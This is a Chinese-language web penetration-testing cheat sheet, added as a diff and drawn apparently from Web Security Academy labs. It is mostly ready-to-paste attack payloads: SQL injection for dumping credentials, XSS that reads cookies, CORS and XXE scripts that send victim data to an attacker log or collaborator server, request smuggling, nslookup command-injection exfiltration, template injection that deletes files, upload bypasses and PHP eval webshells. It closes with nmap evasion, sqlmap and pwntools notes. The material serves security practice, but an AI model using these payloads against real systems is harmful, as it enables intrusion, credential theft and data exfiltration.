@@ -1,0 +1,658 @@
+sql inject
+xml
+<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
+手注
+1'select schema_name from information_schema.schemata（查库）
+1'select table_name from information_schema.tables where table_schema='库名'（查表）
+1'select column_name from information_schema.colums where table_name='表名'（查列）
+NULL UNION SELECT GROUP_CONCAT(table_name) AS title, NULL AS body FROM information_schema.tables WHERE table_schema=database()表
+NULL UNION SELECT GROUP_CONCAT(column_name) as title, NULL as body FROM information_schema.columns WHERE table_name='table'列
+NULL UNION SELECT GROUP_CONCAT(headers) AS title, '' AS body FROM table行
+1'select 列名 from 库名.表名（查数据）
+group_concat(表名)合并输出
+order by x查列
+union用于合并结果
+load_file()函数可以利用绝对路径去加载一个文件
+查版本
+'+UNION+SELECT+BANNER,+NULL+FROM+v$version-- 基于oracle
+'+UNION+SELECT+@@version,+NULL-- 基于mysql
+不基于oracle
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- 查表
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'-- 查段
+'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef-- 脱字节
+基于条件错误的sql盲注
+'||(SELECT '')||' 测试
+'||(SELECT '' FROM 可能存在的表)||' 基于oracle的测试
+'||(SELECT '' FROM not-a-real-table)||' 此测试将返回错误
+'||(SELECT '' FROM users WHERE ROWNUM = 1)||' 此测试应返回正常
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM 表 WHERE 列='段')||' 判断值是否存在
+'||(SELECT CASE WHEN LENGTH(值)>1 THEN to_char(1/0) ELSE '' END FROM 表 WHERE 列=段')||' 判断值大小
+'||(SELECT CASE WHEN SUBSTR(值,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM 表 WHERE 列='段')||' 盲猜
+基于oracle
+盲注
+1'and (length(database())=8) 库长
+1'and (left(database(),1)='s') 库名
+1'AND (select count(table_name) from information_schema.`TABLES` where table_schema = database()) = 4 表数
+1'AND (LENGTH((select table_name from information_schema.`TABLES` where table_schema = database() LIMIT 0,1))) = 6 指定表名长
+1'AND ASCII(SUBSTR((select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT 0,1),1,1)) = 101 表名
+1'AND (select count(column_name) from information_schema.columns where table_name = "users") = 3 列数
+1'AND ASCII(SUBSTR((select column_name from information_schema.columns where table_name = "users" limit 0,1),2,1)) 列长
+1'AND ASCII(SUBSTR((select column_name from information_schema.columns where table_name = "users" limit 0,1),1,1)) = 105 列名
+1 AND (select count(username) from users) = 13 段数
+1'AND ASCII(SUBSTR((select username from users  limit 0,1),4,1)) 段长
+1'and ASCII(SUBSTR((select username from users  limit 0,1),1,1))  = 68 
+基于时间的盲注
+'%3BSELECT+CASE+WHEN+(列='段=值')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+表-- 判值是否存在
+'%3BSELECT+CASE+WHEN+(列='值'+AND+LENGTH(值)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+表-- 判断值长
+'%3BSELECT+CASE+WHEN+(列='值'+AND+SUBSTRING(值,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+表-- 求值
+sql外带
+'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+--表
+'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+列+FROM+表+WHERE+列值%3d'具体值')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+noreal- 查询
+堆叠注入
+mysql_multi_query() 支持多条sql语句同时执行，就是个;分隔，成堆的执行sql语句子,语句并列执行
+1';show databases;#　　//获取数据库名
+1';show tables;#　　　　//获取表名
+1’；desc `表名` 　　　　//获取表结构
+HANDLER 语句
+HANDLER table_name OPEN：打开一个表的句柄。
+HANDLER table_name READ NEXT：访问表的索引。
+HANDLER table_name CLOSE：关闭已经打开的句柄。
+rename table 原名 要改的名字
+报错注入
+基于extractvalue函数针对mysql数据库
+查数据库名：id='and(select extractvalue(1,concat(0x7e,(select database()))))
+爆表名：id='and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))
+爆字段名：id='and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="TABLE_NAME"))))
+爆数据：id='and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))
+基于updatexml函数针对mysql数据库
+爆数据库名：'and(select updatexml(1,concat(0x7e,(select database())),0x7e))
+爆表名：'and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))
+爆列名：'and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name="TABLE_NAME")),0x7e))
+爆数据：'and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))
+基于有报错回显的利用
+' AND CAST((poc*) AS int)--
+xss
+常用测试语句
+'-alert(1)-'
+\'-alert(1)//
+'"><img/src=1>
+<svg onload="alert(1)">
+"><svg onload=alert(1)>
+"onmouseover="alert(1)
+<script>alert("hack")</script>
+<img src=1 oNeRrOr=alert`1`>
+<style οnlοad=alert(1)></style>   
+javascript:alert(document.cookie)
+<img  src=1  οnerrοr=alert("hack")>
+<input onfocus="alert('xss');" autofocus>
+<script>alert(document.cookie)</script>      
+<script src=http://xxx.com/xss.js></script>  
+<input onblur=alert("xss") autofocus><input autofocus>
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+变形绕过
+${alert(1)}
+\"-alert(1)}//
+%27x%27onclick=%27alert(1) 当用户按下访问键时，将调用该函数 在视窗上：ALT+SHIFT+X在 MacOS 上：CTRL+ALT+X在 Linux 上：Alt+X
+{{$on.constructor('alert(1)')()}}
+<><img src=1 onerror=alert(1)>
+</script><script>alert(1)</script>
+%22%3E%3Cbody%20onresize=print()%3E
+"></select><img%20src=1%20onerror=alert(1)>
+%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
+%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%201%3E#x';</script>
+5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%2
+1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1 绕过js沙箱
+<input%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27>#x js沙箱转义
+xss网址
+http://foo?&apos;-alert(1)-&apos;
+诱导式
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
+Csrf写法
+(Csrf的重点在于验证的不严格）
+<meta name="referrer" content="no-referrer"> 设置referrer头为空
+<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/> 发送请求到特定网址
+<script>
+ window.onclick = () => { 
+window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+setTimeout(changeEmail, 5000);
+} 
+function changeEmail()
+ { document.forms[0].submit(); }
+ </script>
+诱导重置链接
+点击劫持
+<style>
+    iframe {
+        position:relative;
+        width:窗口长px;
+        height:窗口宽px;
+        opacity:透明度;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:下偏移px;
+        left:右偏移px;
+        z-index: 1;
+    }
+</style>
+<div>诱导语句</div>
+<iframe sandbox="allow-forms”> //绕过某些过滤
+<iframe src="https://xxxxxxx/"></iframe>//试着在参数中添加xss语句
+在屏幕中显示一个窗口以用来诱导点击 div为诱导语句的位置设置
+<style>
+	iframe {
+		position:relative;
+		width:$width_value;
+		height: $height_value;
+		opacity: $opacity;
+		z-index: 2;
+	}
+   .firstClick, .secondClick {
+		position:absolute;
+		top:$top_value1;
+		left:$side_value1;
+		z-index: 1;
+	}
+   .secondClick {
+		top:$top_value2;
+		left:$side_value2;
+	}
+</style>
+<div class="firstClick">Test me first</div>
+<div class="secondClick">Test me next</div>
+<iframe src="xxx"></iframe>
+两个诱导点的实例
+Domxss
+<iframe src="xxx" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+主动型反射
+<iframe src="xxx" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
+<iframe src=xxx onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
+基于js的主动反射
+<iframe src="xxxx&'><script>print()</script>" onload="if(!window.x)this.src='xxx';window.x=1;">
+被动Cooki污染
+Exp:<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
+Js对应源码:let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
+dom破坏导致xss（本质为方法变量的覆盖,类似sql二次注入，只有在你所覆盖的变量被使用后触发）
+<form onclick=alert(1)><input id=attributes>Click me 示例
+
+应该注意Ulr参数
+CORS
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','目标/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='反射服务器/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>">
+</iframe>
+利用不正确的配置读取受害者密钥
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','目标',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='反射服务器/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
+信任空来源的利用
+<script>
+var q = [], collaboratorURL = 'http://$collaboratorPayload';
+for(i=1;i<=255;i++) {
+	q.push(function(url) {
+		return function(wait) {
+			fetchUrl(url, wait);
+		}
+	}('http://192.168.0.'+i+':8080'));
+}
+for(i=1;i<=20;i++){
+	if(q.length)q.shift()(i*100);
+}
+function fetchUrl(url, wait) {
+	var controller = new AbortController(), signal = controller.signal;
+	fetch(url, {signal}).then(r => r.text().then(text => {
+		location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now();
+	}))
+	.catch(e => {
+		if(q.length) {
+			q.shift()(wait);
+		}
+	});
+	setTimeout(x => {
+		controller.abort();
+		if(q.length) {
+			q.shift()(wait);
+		}
+	}, wait);
+}
+</script>
+探测内网开放ip端口
+设置为信任的服务器可能导致绕过防火墙
+
+Xxe
+<!DOCTYPE test [ <!ENTITY test SYSTEM "命令"> ]> 文件读取
+<!DOCTYPE test [ <!ENTITY test SYSTEM "网址"> ]> ssrf
+---------------------------------------------------------------------------------------------------------------------------------------------------
+恶意外部 DTD
+<!ENTITY % file SYSTEM "xxx">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
+%eval;
+%exfil;
+反射端
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+受害端需要的语句
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+基于错误的dtd语句替换第二句话
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+使用Apache/Batik库上传svg文件过滤问题导致的xxe
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+猜测服务器有的dtd文件来触发xxe
+http请求走私
+POST / HTTP/1.1
+Host: xxx
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+X-Ignore: X
+POST / HTTP/1.1
+Host: xxx
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+5e
+POST /404 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0\n\n
+判断CL.TE的存在的两种方式 若存在会返回404
+POST / HTTP/1.1
+Host:xxx
+Content-Type: application/x-www-form-urlencoded
+Content-Length:4
+Transfer-Encoding: chunked
+
+0
+
+GET /xxx HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+利用漏洞来绕过文件路径限制
+87
+GET /xxx HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0\n\n
+这种正文格式也可以进行绕过
+X-abcdef-Ip: 127.0.0.1添加在第二块中可以绕过某些限制
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 256
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=your-session-token
+
+csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
+第二块的发包内容会被受害者接收并发出，还可以导致xss
+http2请求走私
+POST /x HTTP/2
+Host: YOUR-LAB-ID.web-security-academy.net
+Transfer-Encoding: chunked
+
+0(只有换行也可以)
+
+GET /x HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+CRLF注入
+%0d%0a
+Foo: bar\nTransfer-Encoding: chunked
+这本身似乎相对无害，但是当它被重写为 HTTP/1 请求时，它将再次被解释为标头分隔符。因此，HTTP/1 后端服务器将看到两个不同的标头:
+Foo: bar
+Transfer-Encoding: chunked
+bar\r\n
+\r\n
+GET /x HTTP/1.1\r\n
+Host: YOUR-LAB-ID.web-security-academy.net
+使用这种方式来走私请求
+CL.0
+POST /vulnerable-endpoint HTTP/1.1
+Host: vulnerable-website.com
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+GET /hopefully404 HTTP/1.1
+Foo: xGET / HTTP/1.1
+Host: vulnerable-website.com
+1创建一个包含安装请求的选项卡和另一个包含任意后续请求的选项卡。
+2按正确的顺序将两个选项卡添加到组中。
+3使用发送按钮旁边的下拉菜单，将发送模式更改为按顺序发送组（单个连接）。
+4将标题更改为 。Connectionkeep-alive
+5发送序列并检查响应。
+Cmdinject
+测试语句
+1|whoami
+x||ping+-c+10+127.0.0.1||
+||whoami>/var/www/images/output.txt|| 配合 文件加载
+x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN|| 外带注入
+||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
+服务器端模板注入
+测试语句及对应利用
+${{<%[%'"}}%\
+{{7*7}} ${7*7} <%= 7*7 %> ${{7*7}} #{7*7} *{7*7}
+<%25%3d+7*7+%25>
+<%= system("rm /home/carlos/morale.txt") %>
+{{7*7}}
+}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ifconfig") }
+缓存中毒
+使用无效化参数cooike,miss缓存 ？Xxx=xxx
+X-Cache: hit 代表响应来自缓存
+利用头,利用两个头来绕过一些防护
+X-Forwarded-Host
+X-Forwarded-Scheme
+X-Host
+特定的主机头也会导致缓存中毒
+改变参数仍命中会导致参数反射进而导致xss
+JWT签名
+标头、有效负载和签名
+eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA
+1,有效负载中可能出现，目录穿越，注入，逻辑漏洞
+2,表头置空可能导致逻辑问题绕过加密
+3,利用拓展来生成恶意签名来绕过加密
+4,泄露的公私匙
+目录穿越与文件上传
+注意filename值
+filename="..%2fexploit.php"
+可用后缀配合随机大小写
+.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf
+测试语句
+../../../etc/passwd
+....//....//....//etc/passwd
+..%252f..%252f..%252fetc/passwd
+../../../etc/passwd%00.png
+.htaccess利用
+AddType application/main .main
+.htaccess前不要加前缀
+创建有以上内容的.htaccess
+Content-Type设置为text/plain
+上传shell是使用application/main
+exploit.php%00.jpg 00截断
+webshell.php.
+webshell.php::$DATA
+php语句放在图片文件末尾可以绕过部分机制
+
+主机标头攻击
+Host:xxx.com
+1，会导致某些逻辑漏洞
+2，绕过某些访问限制（host:localhost）
+3，允许同时存在两个host可能会引发缓存中毒
+4，将host头改为例如127.0.0.1可能可以进行内网资源探测
+5，GET https://web-security-academy.net/将导致ssfr
+Ssrf
+一直试网址@绕过以及编码
+针对本地服务器 http://localhost/xxx
+针对后端系统 http://192.168.0.1:8080/xxx
+反序列化
+{“xx”,”xx”}
+当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)
+O:4:"Name":类似这里的数字加1:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";}
+2is_valid()
+要求我们传入的str的每个字母的ascii值在32和125之间。因为protected属性在序列化之后会出现不可见字符\00*\00，不符合上面的要求。
+绕过方法：因为php7.1以上的版本对属性类型不敏感，所以可以将属性改为public，public属性序列化不会出现不可见字符
+爆破
+1,基于返回状态不同判断
+2,基于响应的细微差别判断
+3,基于输入过长字符干扰判断响应事件
+4,利用逻辑漏洞重置禁止访问前的次数
+Dom污染
+在浏览器控制台中输入Object.prototype以查看属性来发现被污染的函数
+查看元素中是否有foo来判断漏洞是否存在
+测试语句
+/?__proto__[foo]=bar
+/?__proto__.foo=bar
+/?constructor.prototype.foo=bar
+/?__proto__[被污染的原型]=foo
+/#__proto__[hitCallback]=alert%28document.cookie%29
+基本的利用
+/?__proto__[transport_url]=data:,alert(1); 
+基本的绕过
+/?__pro__proto__to__[foo]=bar 
+/?__pro__proto__to__.foo=bar 
+/?constconstructorructor.[protoprototypetype][foo]=bar /?constconstructorructor.protoprototypetype.foo=bar
+Json
+"__proto__": { "foo":"bar" }
+"__proto__": { "isAdmin":true }
+文件读取?file
+伪协议读入
+data://text/内容
+ImageMagick 文档有一个 text 格式，可以读入文件内容
+<image xlink:href="text:/flag" x="0" y="0" height="640px" width="480px"/>
+php://filter/read=convert.base64-encode/resource=文件名
+各种木马
+Php
+<?php eval(@$_POST['a']); ?>
+<script language='php'>@eval($_POST['l1ack']);</script>
+<?php echo file_get_contents('/xxx'); ?>
+头
+1,referer用于欺骗网址
+2,User-Agent 更改用于欺骗服务器自己的浏览器计算机类型
+3,X-Forwarded-For:用于欺骗ip
+4,Referrer-Policy: unsafe-url允许referer中存在查询字符
+5，X-Original-URL: 绕过访问限制
+pwn
+危险的函数
+函数    	 严重性    解决方案
+gets     	最危险    使用 fgets（buf, size, stdin）。这几乎总是一个大问题！
+strcpy   	很危险    改为使用 strncpy。
+strcat  	很危险    改为使用 strncat。
+sprintf 	很危险    改为使用 snprintf，或者使用精度说明符。
+scanf   	很危险    使用精度说明符，或自己进行解析。
+sscanf  	很危险    使用精度说明符，或自己进行解析。
+fscanf   	很危险    使用精度说明符，或自己进行解析。
+vfscanf  	很危险    使用精度说明符，或自己进行解析。
+vsprintf 	很危险    改为使用 vsnprintf，或者使用精度说明符。
+vscanf   	很危险    使用精度说明符，或自己进行解析。
+vsscanf  	很危险    使用精度说明符，或自己进行解析。
+streadd  	很危险    确保分配的目的地参数大小是源参数大小的四倍。
+strecpy  	很危险    确保分配的目的地参数大小是源参数大小的四倍。
+strtrns  	危险      手工检查来查看目的地大小是否至少与源字符串相等。
+realpath 	很危险   （或稍小，取决于实现）    分配缓冲区大小为 MAXPATHLEN。同样，手工检查参数以确保输入参数不超过 MAXPATHLEN。
+syslog   	很危险   （或稍小，取决于实现）    在将字符串输入传递给该函数之前，将所有字符串输入截成合理的大小。
+getopt   	很危险   （或稍小，取决于实现）    在将字符串输入传递给该函数之前，将所有字符串输入截成合理的大小。
+getopt_long 	很危险   （或稍小，取决于实现）    在将字符串输入传递给该函数之前，将所有字符串输入截成合理的大小。
+getpass   	很危险   （或稍小，取决于实现）    在将字符串输入传递给该函数之前，将所有字符串输入截成合理的大小。
+getchar   	中等危险   如果在循环中使用该函数，确保检查缓冲区边界。
+fgetc      	中等危险   如果在循环中使用该函数，确保检查缓冲区边界。
+getc      	中等危险   如果在循环中使用该函数，确保检查缓冲区边界。
+read      	中等危险   如果在循环中使用该函数，确保检查缓冲区边界。
+bcopy     	低危险     确保缓冲区大小与它所说的一样大。
+fgets      	低危险     确保缓冲区大小与它所说的一样大。
+memcpy  	低危险     确保缓冲区大小与它所说的一样大。
+snprintf   	低危险     确保缓冲区大小与它所说的一样大。
+strccpy    	低危险    确保缓冲区大小与它所说的一样大。
+strcadd    	低危险    确保缓冲区大小与它所说的一样大。
+strncpy    	低危险    确保缓冲区大小与它所说的一样大。
+vsnprintf  	 低危险    确保缓冲区大小与它所说的一样大。
+pythonpwntool编写方式
+from pwn import *
+本地接口mia=process("./文件")
+远程端口mia=remote("ip",端口)
+收取回显信息mai.recvlin/recvlin()
+发送数据mai.send()
+以32/64位发送p64()/p32() #py3里要加->.decode("iso-8859-1")
+shellcraft.sh() 获取一个shell
+asm() 机器码转换
+mia.interactive()进入交互模式
+工具命令备忘
+Pwngdb
+命令		  缩写		效果
+gdb <file> <*pid>		添加新程序
+gdb attach <pid>		负载运行的程序
+set args <*argv>		设置程序运行参数
+show args		        查看设置好的运行参数
+quit	q	  	        退出gdb
+symbol <file> sy	        导入符号表
+info <*b>i	             	查看程序的状态/*查看断点
+frame	f	       		查看栈帧
+Backtrace bt	       		查看堆栈情况
+list	l	                显示源代码
+(debug模式)
+Display disp	                跟踪查看某个变量
+start	s	                启动程序并中断在入口
+Debug         	                模式停在main()，否则停在start()
+run	r	                直接运行程序直到断点 x
+continue	  c	        暂停后继续执行程序
+next	n		        单步步过
+step	s	 		单步步入，函数跟踪
+finish	fin	 		跳出，执行到函数返回处
+break /*<addr>	  b		下断点
+watch				下内存断点并监视内存情况
+print	p			打印符号信息(debug模式)
+i r a				查看所有寄存器
+i r <esp/ebp..>			查看某个寄存器
+set $esp = 0x01			修改某个寄存器的值
+heap				查看分配的chunk
+vmmap				查看内存分配情况
+bin				查看 Bin 情况
+x /<num><n/f/u>			显示内存信息，具体用法附在下面
+context				打印 pwnbdg 页面信息
+dps <addr>			优雅地显示内存信息
+disassemble <func>		打印函数信息
+vmmap				显示程序内存结构
+search <*argv>			搜索内存中的值
+输入 search -h 			可查询用法
+checksec			查看程序保护机制
+parseheap			优雅地查看分配的chunk
+aslr <on/off>			打开/关闭 ASLR 保护
+pshow				显示各种踏板选项和其他设置
+dumpargs <num>			显示在调用指令处停止时传递给函数的参数
+dumprop <from> <to>		显示特定内存范围内的所有ROP gadgets
+elfheader			从调试的elf文件获取头信息
+elfsymbol			从ELF文件获取非调试符号信息
+procinfo			显示来自/proc/pid的各种信息
+readelf				从elf文件获取头信息
+nmap
+主机发现
+iR                                                       随机选择目标
+-iL                                                      从文件中加载IP地址
+-sL                                                      简单的扫描目标
+-sn                                                      Ping扫描-禁用端口扫描
+-Pn                                                      将所有主机视为在在线，跳过主机发现
+-PS[portlist]                                           （TCP SYN ping） 需要root权限
+-PA[portlist]                                           （TCP ACK ping）
+-PU[portlist]                                           （UDP  ping）
+-PY [portlist]                                          （SCTP ping）
+-PE/PP/PM                                                ICMP回显，时间戳和网络掩码请求探测
+-PO[协议列表]                                            IP协议Ping
+-n/-R                                                    从不执行DNS解析/始终解析[默认：有时]
+--dns-servers                                            指定自定义DNS服务器
+--system-dns                                             使用OS的dns服务器
+--traceroute                                             跟踪到每个主机的跃点路径
+扫描技术
+-sS                                                      使用TCP的SYN进行扫描
+-sT                                                      使用TCP进行扫描
+-sA                                                      使用TCP的ACK进行扫描
+-sU                                                      UDP扫描
+-sI                                                      Idle扫描
+-sF                                                      FIN扫描
+-b<FTP中继主机>                                    	 FTP反弹扫描
+端口规格和扫描顺序
+-p                                                       扫描指定端口
+--exclude-ports                                          从扫描中排除指定端口
+-f                                                       快速模式-扫描比默认扫描更少的端口
+-r                                                       连续扫描端口-不随机化
+--top-ports                                              扫描<number>最常用的端口
+服务/版本探测
+-sV                                                      探测服务/版本信息
+--version-intensity                                      设置版本扫描强度（0-9）
+--version-all                                            尝试每个强度探测
+--version-trace                                          显示详细的版本扫描活动（用于调试）
+脚本扫描
+-SC                                                    	 等效于 --script=defult
+--script = <lua scripts>,<lua scripts>                   以逗号分隔的目录，脚本文件或脚本类别
+--script-args = <n1=v1, n2=v2>                 		 为脚本提供参数
+--script-args-file=文件名                          	 从文件名中加载脚本参数
+--script-trace                                           显示发送和接受的所有数据
+--script-updatedb                                        更新脚本数据库
+--script-help=<lua scripts>                      	 显示有关脚本的帮助
+操作系统检测
+-o                                                       启用os检测
+--osscan-limit                                           将os检测限制为可能的目标
+--osscan-guess                                       	 推测操作系统检测结果
+时间和性能
+--host-timeout                                         	 设置超时时间
+--scan-delay                                          	 设置探测之间的时间间隔
+-T  <0-5>                                                设置时间模板,值越小，IDS报警几率越低
+防火墙/IDS规避和欺骗
+-f                                                       报文分段
+-s                                                       欺骗源地址
+-g                                                       使用指定的本机端口
+--proxies <url,port>                                 	 使用HTTP/SOCK4代理
+-data<hex string>                                   	 想发送的数据包中追加自定义的负载
+--data-string                                            将自定义的ACSII字符串附加到发送数据包中
+--data-length                                            发送数据包时，附加随机数据
+--spoof-mac                                              MAC地址欺骗
+--badsum                                                 发送带有虚假TCP/UNP/STCP校验和的数据包
+输出
+-oN                                                      标准输出
+-oX                                                      XMl输出
+-oS                                                      script jlddi3
+-oG                                                      grepable
+-oA                                                      同时输出三种主要格式
+-v                                                       信息详细级别
+-d                                                       调试级别
+--packet-trace                                           跟踪发送和接收的报文
+--reason                                                 显示端口处于特殊状态的原因
+--open                                                   仅显示开放的端口
+杂项
+-6                                                       启动Ipv6扫描
+-A                                                       启动Os检测，版本检测，脚本扫描和traceroute
+-V                                                       显示版本号
+-h                                                       帮助信息
+sqlmap
+-dbs 脱库
+-tables 脱表
+-columns 脱断
+-dump 数据脱出
+-d 定库
+-t 定表
+-c 定段
+--technique
+B: Boolean-based blind SQL injection（布尔型注入）
+E: Error-based SQL injection（报错型注入）
+U: UNION query SQL injection（可联合查询注入）
+S: Stacked queries SQL injection（可多语句查询注入）
+T: Time-based blind SQL injection（基于时间延迟注入）
